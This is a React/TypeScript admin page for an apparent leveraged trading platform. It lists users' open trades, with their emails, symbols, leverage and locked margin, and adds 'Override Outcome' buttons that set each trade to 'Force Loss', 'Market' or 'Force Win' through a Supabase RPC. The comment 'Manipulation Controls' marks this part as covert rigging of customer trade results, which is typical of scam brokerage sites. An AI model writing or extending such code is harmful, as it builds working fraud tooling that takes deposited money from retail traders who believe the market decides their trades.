"use client";
import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { 
  Activity, Target, TrendingUp, TrendingDown, 
  Zap, ShieldAlert, Loader2, SearchX, 
  User, RefreshCcw, Eye
} from "lucide-react";
import { createBrowserClient } from "@supabase/ssr";

const supabase = createBrowserClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!);

export default function AdminLiveTrades() {
  const [trades, setTrades] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [updatingId, setUpdatingId] = useState<string | null>(null);

  const fetchLiveTrades = async () => {
    setLoading(true);
    const { data } = await supabase
      .from('trades')
      .select('*, users(email, full_name)')
      .eq('status', 'open')
      .order('created_at', { ascending: false });

    setTrades(data || []);
    setLoading(false);
  };

  useEffect(() => { fetchLiveTrades(); }, []);

  const changeControl = async (tradeId: string, mode: 'normal' | 'force_win' | 'force_loss') => {
    setUpdatingId(tradeId);
    const { data } = await supabase.rpc('update_trade_control', {
      p_trade_id: tradeId,
      p_control: mode
    });

    if (data?.success) {
      setTrades(prev => prev.map(t => t.id === tradeId ? { ...t, admin_control: mode } : t));
    }
    setUpdatingId(null);
  };

  return (
    <div className="p-6 pb-32">
      {/* VIP Header */}
      <div className="flex items-center justify-between mb-10">
        <div>
          <h1 className="text-2xl font-black uppercase tracking-tighter">Trade Surveillance</h1>
          <p className="text-[10px] text-yellow-500 font-bold uppercase tracking-[0.3em] flex items-center gap-2">
            <Activity size={12} className="animate-pulse" /> Live Market Exposure
          </p>
        </div>
        <button onClick={fetchLiveTrades} className="p-3 bg-slate-900 border border-slate-800 rounded-2xl active:rotate-180 transition-all duration-500">
           <RefreshCcw size={18} className="text-slate-500" />
        </button>
      </div>

      {loading ? (
        <div className="flex flex-col items-center py-20 opacity-30">
          <Loader2 className="animate-spin text-yellow-500 mb-4" size={40} />
          <p className="text-[10px] font-black uppercase tracking-widest">Interpreting Order Book...</p>
        </div>
      ) : trades.length === 0 ? (
        <div className="text-center py-20 bg-slate-900/40 rounded-[40px] border border-dashed border-slate-800">
          <Target className="mx-auto mb-4 text-slate-700" size={48} />
          <p className="text-slate-500 text-xs font-bold uppercase tracking-widest">No Active Trades in Market</p>
        </div>
      ) : (
        <div className="space-y-6">
          {trades.map((trade) => (
            <motion.div
              key={trade.id}
              initial={{ opacity: 0, scale: 0.98 }}
              animate={{ opacity: 1, scale: 1 }}
              className="bg-slate-900/80 border border-slate-800 rounded-[35px] overflow-hidden shadow-2xl"
            >
              {/* Trade Top Bar */}
              <div className="p-5 border-b border-slate-800 flex justify-between items-center bg-slate-950/40">
                <div className="flex items-center gap-3">
                   <div className={`w-8 h-8 rounded-lg flex items-center justify-center ${trade.trade_direction === 'long' ? 'bg-emerald-500/10 text-emerald-500' : 'bg-rose-500/10 text-rose-500'}`}>
                      {trade.trade_direction === 'long' ? <TrendingUp size={16} /> : <TrendingDown size={16} />}
                   </div>
                   <div>
                      <h4 className="text-xs font-black text-slate-100">{trade.symbol} <span className="text-slate-500 font-normal">/ {trade.leverage}x</span></h4>
                      <p className="text-[8px] text-slate-500 uppercase font-bold tracking-tighter">{trade.users?.email}</p>
                   </div>
                </div>
                <div className={`px-3 py-1 rounded-full text-[8px] font-black uppercase tracking-widest ${
                  trade.admin_control === 'normal' ? 'bg-blue-500/10 text-blue-500' : 
                  trade.admin_control === 'force_win' ? 'bg-emerald-500/10 text-emerald-500 animate-pulse' : 
                  'bg-rose-500/10 text-rose-500 animate-pulse'
                }`}>
                  Mode: {trade.admin_control}
                </div>
              </div>

              {/* Trade Stats */}
              <div className="p-6 grid grid-cols-2 gap-6 border-b border-slate-800/50">
                <div>
                  <p className="text-[9px] text-slate-600 font-bold uppercase mb-1">Entry Price</p>
                  <p className="text-sm font-black font-mono">${Number(trade.entry_price).toFixed(2)}</p>
                </div>
                <div>
                  <p className="text-[9px] text-slate-600 font-bold uppercase mb-1">Margin Locked</p>
                  <p className="text-sm font-black font-mono text-yellow-500">${Number(trade.margin_amount).toFixed(2)}</p>
                </div>
              </div>

              {/* Manipulation Controls */}
              <div className="p-6 bg-slate-950/20">
                <p className="text-[9px] text-slate-500 font-black uppercase tracking-[0.2em] mb-4 text-center">Override Outcome</p>
                
                <div className="flex gap-2">
                  <ControlButton 
                    active={trade.admin_control === 'force_loss'} 
                    label="Force Loss" 
                    color="rose"
                    loading={updatingId === trade.id}
                    onClick={() => changeControl(trade.id, 'force_loss')}
                  />
                  <ControlButton 
                    active={trade.admin_control === 'normal'} 
                    label="Market" 
                    color="blue"
                    loading={updatingId === trade.id}
                    onClick={() => changeControl(trade.id, 'normal')}
                  />
                  <ControlButton 
                    active={trade.admin_control === 'force_win'} 
                    label="Force Win" 
                    color="emerald"
                    loading={updatingId === trade.id}
                    onClick={() => changeControl(trade.id, 'force_win')}
                  />
                </div>
              </div>
            </motion.div>
          ))}
        </div>
      )}
    </div>
  );
}

// Custom Control Button
function ControlButton({ active, label, color, onClick, loading }: any) {
  const colors: any = {
    rose: active ? 'bg-rose-500 text-white shadow-rose-500/20' : 'bg-slate-900 text-rose-500 border-rose-500/20',
    blue: active ? 'bg-blue-500 text-white shadow-blue-500/20' : 'bg-slate-900 text-blue-500 border-blue-500/20',
    emerald: active ? 'bg-emerald-500 text-slate-950 shadow-emerald-500/20' : 'bg-slate-900 text-emerald-500 border-emerald-500/20'
  };

  return (
    <button 
      disabled={loading}
      onClick={onClick}
      className={`flex-1 h-12 rounded-xl text-[9px] font-black uppercase tracking-widest border transition-all active:scale-95 flex items-center justify-center ${colors[color]}`}
    >
      {loading ? <Loader2 className="animate-spin" size={12} /> : label}
    </button>
  );
}